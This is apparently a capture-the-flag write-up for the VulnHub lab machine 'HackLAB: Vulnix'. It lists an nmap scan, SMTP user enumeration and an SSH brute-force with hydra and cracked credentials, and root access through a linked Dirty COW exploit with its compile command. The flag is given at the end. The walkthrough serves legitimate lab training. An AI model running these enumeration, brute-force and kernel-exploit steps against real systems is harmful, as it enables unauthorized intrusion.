<h1>HackLAB: Vulnix Write-up</h1>

<h2>Nmap</h2>

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
79/tcp    open  finger     Linux fingerd
110/tcp   open  pop3       Dovecot pop3d
111/tcp   open  rpcbind    2-4 (RPC #100000)
143/tcp   open  imap       Dovecot imapd
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  shell      Netkit rshd
993/tcp   open  ssl/imaps?
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
39706/tcp open  mountd     1-3 (RPC #100005)
45298/tcp open  nlockmgr   1-4 (RPC #100021)
45722/tcp open  mountd     1-3 (RPC #100005)
50907/tcp open  status     1 (RPC #100024)
54193/tcp open  mountd     1-3 (RPC #100005)
```

<h3>Enumerating users</h3>

```smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.123.130```


**BruteForcing SSH**

``` 
hydra -l user -P rockyou.txt 192.168.123.130 ssh
username : user
password : letmein
```


<h2>Privilege Escalation :</h2>

Exploit : https://www.exploit-db.com/exploits/40839

Compile Exploit in your system

```gcc -pthread dirty.c -o dirty32 -lcrypt -m32```

Transfer to vulnix and run the exploit

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/HackLAB%3A%20Vulnix/Images/priv%20esc%20and%20flag.png)

flag : cc614640424f5bd60ce5d5264899c3be

